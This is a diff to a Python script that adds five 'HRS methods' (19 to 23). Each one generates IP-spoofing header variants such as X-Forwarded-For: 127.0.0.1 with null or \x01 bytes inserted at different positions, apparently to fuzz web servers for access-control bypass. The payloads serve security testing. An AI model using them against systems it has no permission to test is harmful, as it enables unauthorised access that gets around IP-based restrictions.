@@ -328,6 +328,36 @@ for ip_header in ip_headers:
     for ip_header_value in ip_header_values:
         mutation_headers18.append(f"{ip_header}:\x00{ip_header_value}")
 
+# HRS method 19: E.g. `X-Forwarded-For: 127.0.0.1\x00`
+mutation_headers19 = []
+for ip_header in ip_headers:
+    for ip_header_value in ip_header_values:
+        mutation_headers19.append(f"{ip_header}: {ip_header_value}\x00")
+
+# HRS method 20: E.g. `\x01X-Forwarded-For: 127.0.0.1`
+mutation_headers20 = []
+for ip_header in ip_headers:
+    for ip_header_value in ip_header_values:
+        mutation_headers20.append(f"\x01{ip_header}: {ip_header_value}")
+
+# HRS method 21: E.g. `X-Forwarded-For\x01: 127.0.0.1`
+mutation_headers21 = []
+for ip_header in ip_headers:
+    for ip_header_value in ip_header_values:
+        mutation_headers21.append(f"{ip_header}\x01: {ip_header_value}")
+
+# HRS method 22: E.g. `X-Forwarded-For:\x01127.0.0.1`
+mutation_headers22 = []
+for ip_header in ip_headers:
+    for ip_header_value in ip_header_values:
+        mutation_headers22.append(f"{ip_header}:\x01{ip_header_value}")
+
+# HRS method 23: E.g. `X-Forwarded-For: 127.0.0.1\x01`
+mutation_headers23 = []
+for ip_header in ip_headers:
+    for ip_header_value in ip_header_values:
+        mutation_headers23.append(f"{ip_header}: {ip_header_value}\x01")
+
 
 #* To test only selected techniques, comment out that HRS method item from all_mutation_headers dictionary
 all_mutation_headers = {
